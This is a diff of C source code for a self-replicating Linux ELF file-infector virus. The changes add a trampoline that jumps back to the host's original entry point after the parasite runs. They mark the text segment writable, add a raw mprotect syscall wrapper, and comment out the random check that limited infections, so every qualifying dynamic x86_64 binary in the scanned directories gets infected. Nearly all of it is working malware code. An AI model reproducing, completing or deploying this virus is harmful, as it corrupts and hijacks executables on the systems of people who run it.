@@ -43,6 +43,7 @@ int _memcmp(const void *, const void *, unsigned int);
 
 /* syscalls */
 int _fstat(long, void *);
+int _mprotect(void * addr, unsigned long len, int prot);
 long _lseek(long, long, unsigned int);
 void Exit(long);
 void *_mmap(void *, unsigned long, unsigned long, unsigned long,  long, unsigned long);
@@ -59,6 +60,8 @@ int _gettimeofday(struct timeval *, struct timezone *);
 unsigned long get_rip(void);
 void end_code(void);
 void dummy_marker(void);
+
+#define PIC_RESOLVE_ADDR(target) (get_rip() - ((char *)&get_rip_label - (char *)target))
 
 #if defined(DEBUG) && DEBUG > 0
  #define DEBUG_PRINT(fmt, args...) _printf("DEBUG: %s:%d:%s(): " fmt, \
@@ -100,6 +103,7 @@ typedef struct elfbin {
 	char *path;
 	struct stat st;
 	int fd;
+	int original_virus_exe;
 } elfbin_t;
 
 #define DIR_COUNT 3
@@ -227,7 +231,7 @@ char * full_path(char *exe, char *dir, uint8_t **heap)
 	
 #define JMPCODE_LEN 6
 
-int inject_parasite(size_t psize, size_t paddingSize, elfbin_t *target, elfbin_t *self, ElfW(Addr) entry_point)
+int inject_parasite(size_t psize, size_t paddingSize, elfbin_t *target, elfbin_t *self, ElfW(Addr) orig_entry_point)
 {
 	int ofd;
 	unsigned int c;
@@ -259,11 +263,28 @@ int inject_parasite(size_t psize, size_t paddingSize, elfbin_t *target, elfbin_t
          * Now inject the virus
          * [ehdr][virus]
          */
-        if ((c = _write(ofd, parasite, self->size)) != self->size) {
+	void (*f1)(void) = (void (*)())PIC_RESOLVE_ADDR(&end_code);
+        void (*f2)(void) = (void (*)())PIC_RESOLVE_ADDR(&dummy_marker);
+	int end_code_size = (int)((char *)f2 - (char *)f1);
+ 	Elf64_Addr end_code_addr = PIC_RESOLVE_ADDR(&end_code);
+       // long o_entry_offset = end_code_addr - orig_entry_point;
+        uint8_t jmp_patch[6] = {0x68, 0x0, 0x0, 0x0, 0x0, 0xc3};
+	*(uint32_t *)&jmp_patch[1] = orig_entry_point;
+	//_printf("orig_entry point: %x orig offset: %x\n", orig_entry_point, o_entry_offset);
+	_printf("orig: %x\n", orig_entry_point);
+	/*
+	 * Write parasite up until end_code()
+	 */
+	size_t initial_parasite_len = self->size - 1024;
+	initial_parasite_len -= end_code_size;
+        
+	if ((c = _write(ofd, parasite, initial_parasite_len)) != initial_parasite_len) {
 		return -1;
 	}
-
-  	/*
+	_write(ofd, jmp_patch, sizeof(jmp_patch));
+	_write(ofd, &parasite[initial_parasite_len + sizeof(jmp_patch)], 1024 + (end_code_size - sizeof(jmp_patch)));
+  
+	/*
          * Seek to end of tracer.o + PAGE boundary  
          * [ehdr][virus][pad]
          */
@@ -300,6 +321,7 @@ int infect_elf_file(elfbin_t *self, elfbin_t *target)
 	size_t paddingSize;
 	struct stat st;
 	char *host = target->path;
+	long o_entry_offset;
 	/*
 	 * Get size of parasite (self)
 	 */
@@ -326,6 +348,7 @@ int infect_elf_file(elfbin_t *self, elfbin_t *target)
                                 phdr[i].p_paddr -= paddingSize;
                                 phdr[i].p_filesz += paddingSize;
                                 phdr[i].p_memsz += paddingSize;
+				phdr[i].p_flags |= PF_W;
                                 text_found = 1;
                 }
         }
@@ -351,7 +374,20 @@ int infect_elf_file(elfbin_t *self, elfbin_t *target)
 	}
 	ehdr->e_shoff += paddingSize;
 	ehdr->e_phoff += paddingSize;
-
+	
+	/*
+	 * !!!
+	 * If this is not the original Virus executable then we must patch
+	 * in a trampoline:
+	 * Overwrite end_code with a trampoline 'jmp orig_entry_point'
+	 */
+/*
+	uint8_t *patch = (uint8_t *)((long)get_rip() - ((char *)&get_rip_label - (char *)&end_code));
+	ElfW(Addr) end_code_addr = (ElfW(Addr))patch;
+        o_entry_offset = end_code_addr - orig_entry_point;
+        *patch = 0xe9; // jmp
+	*(uint32_t *)&patch[1] = o_entry_offset;
+*/
 	inject_parasite(parasiteSize, paddingSize, target, self, orig_entry_point);
 	
 	return 0;
@@ -365,15 +401,16 @@ int infect_elf_file(elfbin_t *self, elfbin_t *target)
 int load_self(elfbin_t *elf)
 {	
 	int i;
-	void (*f1)(void) = (void *)end_code; //(void (*)())end_code;
-	void (*f2)(void) = (void (*)())dummy_marker;
-	Elf64_Addr _start_addr = get_rip() - ((char *)&get_rip_label - (char *)&_start);
+	void (*f1)(void) = (void (*)())PIC_RESOLVE_ADDR(&end_code);
+	//((long) get_rip() - ((char *)&get_rip_label - (char *)&end_code));
+	void (*f2)(void) = (void (*)())PIC_RESOLVE_ADDR(&dummy_marker);
+	//((long) get_rip() - ((char *)&get_rip_label - (char *)&dummy_marker));
+	Elf64_Addr _start_addr = PIC_RESOLVE_ADDR(&_start);
+	//get_rip() - ((char *)&get_rip_label - (char *)&_start);
 	elf->mem = (uint8_t *)_start_addr;
 	elf->size = (char *)&end_code - (char *)&_start; 
 	elf->size += (int)((char *)f2 - (char *)f1);
-//#if DEBUG // this makes it possible for _printf's to work since we inject .rodata
-	elf->size += 1000;
-//#endif
+	elf->size += 1024; // fixes some type of miscalculation bug :(
 	return 0;
 }
 
@@ -442,23 +479,23 @@ int check_criteria(char *filename)
 	ehdr = (Elf64_Ehdr *)mem;
 	phdr = (Elf64_Phdr *)&mem[ehdr->e_phoff];
 	if(_memcmp("\x7f\x45\x4c\x46", mem, 4) != 0) {
-		DEBUG_PRINT("not an ELF\n");
+	//	DEBUG_PRINT("not an ELF\n");
 		return -1;
 	}
 	magic = *(uint32_t *)((char *)&ehdr->e_ident[EI_PAD]);
 	if (magic == MAGIC_NUMBER) { //already infected? Then skip this file
-		DEBUG_PRINT("is infected\n");
+		//DEBUG_PRINT("is infected\n");
 		return -1;
 	}
 	if (ehdr->e_machine != EM_X86_64) {
-		DEBUG_PRINT("not x86_64\n");
+	//	DEBUG_PRINT("not x86_64\n");
 		return -1;
 	}
 	for (dynamic = 0, i = 0; i < ehdr->e_phnum; i++) 
 		if (phdr[i].p_type == PT_DYNAMIC)	
 			dynamic++;
 	if (!dynamic) {
-		DEBUG_PRINT("not dynamic\n");
+	//	DEBUG_PRINT("not dynamic\n");
 		return -1;
 	}
 	return 0;
@@ -520,9 +557,9 @@ void do_main(struct bootstrap_data *bootstrap)
 				continue;
 			if (check_criteria(fpath = full_path(d->d_name, dir, &heap)) < 0)
 				continue;
-			rnum = get_random_number(10);
-                        if (rnum != LUCKY_NUMBER)
-                                continue;
+	//		rnum = get_random_number(10);
+         //               if (rnum != LUCKY_NUMBER)
+          //                      continue;
 			load_target(fpath, &target);
 			infect_elf_file(&self, &target);
 			unload_target(&target);
@@ -688,6 +725,20 @@ int _munmap(void *addr, size_t len)
                         "mov $11, %%rax\n"
                         "syscall" :: "g"(addr), "g"(len));
         asm ("mov %%rax, %0" : "=r"(ret));
+        return (int)ret;
+}
+
+int _mprotect(void * addr, unsigned long len, int prot)
+{
+        unsigned long ret;
+        __asm__ volatile(
+                        "mov %0, %%rdi\n"
+                        "mov %1, %%rsi\n"
+                        "mov %2, %%rdx\n"
+                        "mov $10, %%rax\n"
+                        "syscall" : : "g"(addr), "g"(len), "g"(prot));
+        asm("mov %%rax, %0" : "=r"(ret));
+        
         return (int)ret;
 }
 
@@ -915,7 +966,6 @@ unsigned long get_rip(void)
 
 void end_code() 
 {
-	__ASM__("nop;nop;nop;nop;nop;nop");
 	Exit(0);
 
 }
